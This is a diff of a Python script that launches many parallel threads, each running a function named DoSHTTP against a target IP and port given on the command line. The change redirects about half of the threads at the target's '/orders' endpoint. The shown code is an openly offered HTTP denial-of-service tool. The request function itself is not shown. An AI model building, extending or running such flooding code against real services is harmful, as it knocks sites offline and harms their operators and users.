@@ -12,8 +12,9 @@ import time
 
 dst_ip = sys.argv[1]
 dst_port = int(sys.argv[2])
-#_ord = '/orders'
+_o = '/orders'
 _url = 'http://' + dst_ip + ':' + str(dst_port)
+_order = _url + _o
 
 # Counter
 i = 0
@@ -45,18 +46,18 @@ def _threads_():
     k = threading.Thread(target=DoSHTTP, args=[_url])
     l = threading.Thread(target=DoSHTTP, args=[_url])
     m = threading.Thread(target=DoSHTTP, args=[_url])
-    n = threading.Thread(target=DoSHTTP, args=[_url])
-    o = threading.Thread(target=DoSHTTP, args=[_url])
-    p = threading.Thread(target=DoSHTTP, args=[_url])
-    q = threading.Thread(target=DoSHTTP, args=[_url])
-    r = threading.Thread(target=DoSHTTP, args=[_url])
-    s = threading.Thread(target=DoSHTTP, args=[_url])
-    t = threading.Thread(target=DoSHTTP, args=[_url])
-    u = threading.Thread(target=DoSHTTP, args=[_url])
-    v = threading.Thread(target=DoSHTTP, args=[_url])
-    x = threading.Thread(target=DoSHTTP, args=[_url])
-    y = threading.Thread(target=DoSHTTP, args=[_url])
-    z = threading.Thread(target=DoSHTTP, args=[_url])
+    n = threading.Thread(target=DoSHTTP, args=[_order])
+    o = threading.Thread(target=DoSHTTP, args=[_order])
+    p = threading.Thread(target=DoSHTTP, args=[_order])
+    q = threading.Thread(target=DoSHTTP, args=[_order])
+    r = threading.Thread(target=DoSHTTP, args=[_order])
+    s = threading.Thread(target=DoSHTTP, args=[_order])
+    t = threading.Thread(target=DoSHTTP, args=[_order])
+    u = threading.Thread(target=DoSHTTP, args=[_order])
+    v = threading.Thread(target=DoSHTTP, args=[_order])
+    x = threading.Thread(target=DoSHTTP, args=[_order])
+    y = threading.Thread(target=DoSHTTP, args=[_order])
+    z = threading.Thread(target=DoSHTTP, args=[_order])
 
     a.start()
     b.start()
